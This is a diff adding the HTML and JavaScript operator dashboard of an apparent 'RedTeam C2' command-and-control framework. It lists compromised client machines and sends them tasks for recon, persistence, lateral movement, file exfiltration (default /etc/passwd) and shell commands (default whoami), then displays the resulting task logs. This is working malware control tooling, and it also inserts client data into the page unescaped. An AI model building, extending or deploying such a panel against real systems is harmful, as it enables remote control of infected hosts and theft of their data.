@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>RedTeam C2</title>
+    <link rel="stylesheet" href="/static/style.css" />
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 RedTeam Framework</h1>
+        <div id="clients"></div>
+        <hr />
+        <div id="log">
+            <pre id="logOutput">📋 Task logs will appear here...</pre>
+        </div>
+    </div>
+
+    <script>
+        async function loadClients() {
+            const res = await fetch('/api/clients');
+            const clients = await res.json();
+            const div = document.getElementById('clients');
+            div.innerHTML = '';
+            clients.forEach(c => {
+                const card = document.createElement('div');
+                card.className = 'client-card';
+                card.innerHTML = `
+                    <span class="status online">●</span>
+                    <strong>${c.id}</strong> (${c.info.os} | ${c.info.user})
+                    <select id="module_${c.id}">
+                        <option value="recon">🔍 Recon</option>
+                        <option value="persistence">🔒 Persistence</option>
+                        <option value="lateral">🌐 Lateral</option>
+                        <option value="exfil">📦 Exfil</option>
+                        <option value="shell">💻 Shell</option>
+                    </select>
+                    <input type="text" id="param_${c.id}" placeholder="Params (e.g., /etc/passwd)" />
+                    <button onclick="sendTask('${c.id}')">⚡ Execute</button>
+                `;
+                div.appendChild(card);
+            });
+        }
+
+        async function sendTask(id) {
+            const module = document.getElementById(`module_${id}`).value;
+            const param = document.getElementById(`param_${id}`).value;
+            const payload = { client_id: id, module: module, params: {} };
+
+            if (module === 'shell') {
+                payload.params.command = param || 'whoami';
+            } else if (module === 'exfil') {
+                payload.params.path = param || '/etc/passwd';
+            } else if (module === 'lateral') {
+                payload.params.target_ip = param || '192.168.1.1';
+            } else if (module === 'persistence') {
+                payload.params.payload_path = param || '/tmp/client';
+            } else {
+                // recon: no params needed
+            }
+
+            const res = await fetch('/api/task', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            });
+            if (!res.ok) alert('Failed to send task');
+        }
+
+        async function loadLogs() {
+            const res = await fetch('/api/logs');
+            const logs = await res.json();
+            const pre = document.getElementById('logOutput');
+            pre.textContent = logs.map(l => JSON.stringify(l, null, 2)).join('\n---\n');
+        }
+
+        setInterval(loadClients, 3000);
+        setInterval(loadLogs, 5000);
+        loadClients();
+        loadLogs();
+    </script>
+</body>
+</html>
